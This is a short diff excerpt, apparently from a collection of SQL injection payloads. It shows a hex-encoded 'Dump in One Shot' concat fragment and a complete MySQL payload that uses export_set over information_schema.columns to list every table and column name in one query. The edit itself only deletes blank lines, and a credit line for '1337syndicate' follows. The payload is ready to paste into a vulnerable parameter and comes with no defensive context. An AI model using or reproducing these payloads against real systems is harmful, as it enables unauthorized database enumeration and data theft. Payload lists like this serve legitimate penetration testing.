@@ -30,9 +30,5 @@ concat (0x3c623e44756d7020696e204f6e652053686f743c2f623e,0x3c62723e,version(),0x
 
 (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
 
-
-
-
-
 "IT Security Development Research"
 https://1337syndicate.github.io/
